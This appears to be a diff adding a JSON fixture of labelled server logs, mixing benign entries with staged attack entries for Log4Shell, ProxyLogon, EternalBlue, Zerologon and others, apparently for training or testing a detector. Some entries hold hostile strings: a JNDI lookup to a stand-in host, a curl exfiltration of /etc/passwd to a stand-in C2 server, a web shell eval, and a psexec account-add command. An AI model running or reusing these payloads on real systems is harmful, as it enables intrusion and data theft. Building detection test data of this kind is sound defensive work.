@@ -1,0 +1,177 @@
+[
+  {
+    "timestamp": "2024-10-01T10:00:00Z",
+    "source_ip": "10.0.1.5",
+    "target": "nginx:1.19",
+    "log": "GET /api/search?query=${jndi:ldap://malicious.example.com/exploit} HTTP/1.1",
+    "description": "Log4Shell Stage 1: Initial JNDI injection attempt"
+  },
+  {
+    "timestamp": "2024-10-01T11:30:00Z",
+    "source_ip": "192.168.50.100",
+    "target": "apache:2.4.51",
+    "log": "GET /index.html HTTP/1.1 200 OK",
+    "description": "Benign log - normal web request"
+  },
+  {
+    "timestamp": "2024-10-02T15:20:00Z",
+    "source_ip": "172.16.0.25",
+    "target": "tomcat:9.0",
+    "log": "POST /login username=admin&password=admin123",
+    "description": "Benign log - normal login attempt"
+  },
+  {
+    "timestamp": "2024-10-05T08:45:00Z",
+    "source_ip": "10.0.2.15",
+    "target": "exchange:2019",
+    "log": "GET /ecp/DDI/DDIService.svc/GetList HTTP/1.1 X-AnonResource-Backend: localhost",
+    "description": "ProxyLogon Stage 1: SSRF exploitation attempt"
+  },
+  {
+    "timestamp": "2024-10-08T14:22:00Z",
+    "source_ip": "10.0.1.5",
+    "target": "nginx:1.19",
+    "log": "POST /upload HTTP/1.1 - Detected Runtime.exec in uploaded JAR file payload.jar",
+    "description": "Log4Shell Stage 2: Command execution after payload delivery"
+  },
+  {
+    "timestamp": "2024-10-10T09:15:00Z",
+    "source_ip": "192.168.1.100",
+    "target": "app-server-01",
+    "log": "INFO Application started successfully on port 8080",
+    "description": "Benign log - application startup"
+  },
+  {
+    "timestamp": "2024-10-12T16:00:00Z",
+    "source_ip": "10.0.2.15",
+    "target": "exchange:2019",
+    "log": "POST /owa/auth/temp.aspx - Web shell detected: eval(Request[\"cmd\"])",
+    "description": "ProxyLogon Stage 2: Web shell deployment"
+  },
+  {
+    "timestamp": "2024-10-15T03:30:00Z",
+    "source_ip": "10.0.3.50",
+    "target": "file-server-01",
+    "log": "SMB1 connection attempt to \\\\\\\\FILE-SERVER-01\\\\PIPE\\\\samr",
+    "description": "EternalBlue Stage 1: SMB exploitation"
+  },
+  {
+    "timestamp": "2024-10-18T11:45:00Z",
+    "source_ip": "10.0.1.5",
+    "target": "nginx:1.19",
+    "log": "Modified crontab detected: @reboot /tmp/.hidden/backdoor.sh",
+    "description": "Log4Shell Stage 3: Persistence mechanism"
+  },
+  {
+    "timestamp": "2024-10-20T14:00:00Z",
+    "source_ip": "172.16.5.10",
+    "target": "db-server-01",
+    "log": "SELECT * FROM users WHERE id=1",
+    "description": "Benign log - normal database query"
+  },
+  {
+    "timestamp": "2024-10-22T07:30:00Z",
+    "source_ip": "10.0.3.50",
+    "target": "file-server-01",
+    "log": "Process created: psexec \\\\\\\\file-server-01 cmd.exe /c net user attacker Pass123! /add",
+    "description": "EternalBlue Stage 2: Post-exploitation command execution"
+  },
+  {
+    "timestamp": "2024-10-25T19:15:00Z",
+    "source_ip": "10.0.2.15",
+    "target": "exchange:2019",
+    "log": "Process dump: lsass.exe memory dumped using procdump64.exe",
+    "description": "ProxyLogon Stage 3: Credential dumping"
+  },
+  {
+    "timestamp": "2024-10-28T05:00:00Z",
+    "source_ip": "192.168.100.50",
+    "target": "web-app-02",
+    "log": "ERROR Database connection timeout after 30 seconds",
+    "description": "Benign log - application error"
+  },
+  {
+    "timestamp": "2024-11-01T12:30:00Z",
+    "source_ip": "10.0.1.5",
+    "target": "nginx:1.19",
+    "log": "Outbound connection: curl -X POST http://c2.attacker.com/exfil -d @/etc/passwd",
+    "description": "Log4Shell Stage 4: Data exfiltration over C2 channel"
+  },
+  {
+    "timestamp": "2024-11-02T10:00:00Z",
+    "source_ip": "10.0.4.20",
+    "target": "vpn-gateway",
+    "log": "FortiOS SSL VPN request: /remote/fgt_lang?lang=../../../sslvpn_websession",
+    "description": "FortiOS Path Traversal Stage 1: Credential file extraction"
+  },
+  {
+    "timestamp": "2024-11-03T08:45:00Z",
+    "source_ip": "172.16.10.5",
+    "target": "domain-controller",
+    "log": "Netlogon authentication bypass detected: NetrServerAuthenticate3 with zero challenge",
+    "description": "Zerologon Stage 1: Netlogon exploitation"
+  },
+  {
+    "timestamp": "2024-11-04T14:20:00Z",
+    "source_ip": "10.0.3.50",
+    "target": "file-server-01",
+    "log": "File encrypted: document.docx.locked - Ransom note: README_HOW_TO_DECRYPT.txt",
+    "description": "EternalBlue Stage 3: Ransomware payload deployment"
+  },
+  {
+    "timestamp": "2024-11-05T11:00:00Z",
+    "source_ip": "10.0.4.20",
+    "target": "vpn-gateway",
+    "log": "SSL-VPN login successful using extracted credentials: user=admin",
+    "description": "FortiOS Stage 3: VPN access with stolen credentials"
+  },
+  {
+    "timestamp": "2024-11-06T16:30:00Z",
+    "source_ip": "172.16.10.5",
+    "target": "domain-controller",
+    "log": "DCSync attack detected: DsGetNCChanges called for krbtgt account",
+    "description": "Zerologon Stage 2: Domain credential dumping"
+  },
+  {
+    "timestamp": "2024-11-07T09:00:00Z",
+    "source_ip": "192.168.20.30",
+    "target": "app-server-03",
+    "log": "INFO User john.doe logged in from 192.168.20.30",
+    "description": "Benign log - normal user login"
+  },
+  {
+    "timestamp": "2024-11-08T13:45:00Z",
+    "source_ip": "172.16.10.5",
+    "target": "domain-controller",
+    "log": "Privileged account usage: Domain Admins group member logged in",
+    "description": "Zerologon Stage 3: Abuse of compromised domain admin credentials"
+  },
+  {
+    "timestamp": "2024-11-09T07:20:00Z",
+    "source_ip": "10.0.5.100",
+    "target": "rdp-server",
+    "log": "RDP connection established from 10.0.5.100 - MS_T120 channel created",
+    "description": "BlueKeep Stage 1: RDP vulnerability exploitation"
+  },
+  {
+    "timestamp": "2024-11-10T15:30:00Z",
+    "source_ip": "192.168.50.200",
+    "target": "web-app-04",
+    "log": "GET /api/products?category=electronics HTTP/1.1 200 OK",
+    "description": "Benign log - API request"
+  },
+  {
+    "timestamp": "2024-11-11T10:15:00Z",
+    "source_ip": "10.0.5.100",
+    "target": "rdp-server",
+    "log": "Lateral movement: CreateProcessAsUser called for cmd.exe on remote system",
+    "description": "BlueKeep Stage 2: Lateral movement via RDP"
+  },
+  {
+    "timestamp": "2024-11-12T06:00:00Z",
+    "source_ip": "172.16.20.15",
+    "target": "backup-server",
+    "log": "Backup completed successfully: 250GB backed up to tape",
+    "description": "Benign log - scheduled backup"
+  }
+]
